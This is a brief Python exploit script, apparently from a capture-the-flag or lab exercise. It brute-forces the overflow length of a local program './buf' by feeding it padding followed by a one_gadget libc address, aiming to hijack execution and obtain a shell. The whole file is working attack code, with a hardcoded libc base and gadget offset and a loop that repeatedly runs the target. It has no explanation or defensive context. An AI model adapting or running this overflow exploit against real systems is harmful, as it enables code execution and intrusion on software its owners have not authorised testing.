from os import system
from struct import pack

for i in range(100, 501):
	tapis = 'A'*i
	libc_base = 0x00007ffff7de8000
	onegadget = pack("Q", libc_base+0xe5756)
	payload = tapis + onegadget
	with open("tmp", "w") as f:
		f.write(payload)
	system("./buf < tmp")
